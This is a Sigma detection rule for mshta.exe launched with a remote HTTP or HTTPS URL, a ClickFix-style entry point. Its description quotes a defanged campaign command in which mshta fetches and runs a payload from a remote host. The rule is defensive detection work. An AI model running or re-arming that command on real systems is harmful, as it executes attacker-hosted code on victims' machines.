title: Mshta Executing Remote URL
id: a3f2e891-bc74-4d60-9e2a-7c1d58f3b047
status: experimental
description: >
    Detects mshta.exe invoked with an HTTP or HTTPS URL as an argument.
    This pattern has essentially no legitimate enterprise use and is the
    entry-point behaviour for ClickFix campaigns that serve polyglot
    HTA/ZIP payloads. The prism-vertex-clickfix campaign used this exact
    pattern: mshta.exe hxxps://prism-vertex[.]com/8761886
references:
    - https://blueteam.cool/posts/prism-vertex-clickfix/
    - https://github.com/BlueTeamCoolTeam/detections/tree/main/campaigns/prism-vertex-clickfix/
    - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
author: Luke Wilkinson
date: 2026-05-24
tags:
    - attack.execution
    - attack.t1218.005
    - attack.defense_evasion
    - attack.t1027.003
    - attack.t1204.004
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
    condition: selection
falsepositives:
    - Essentially none in modern enterprise environments. mshta.exe invoked
      against an external URL is not a legitimate production pattern.
    - Security researchers or red teams testing LOLBIN detection coverage.
level: high
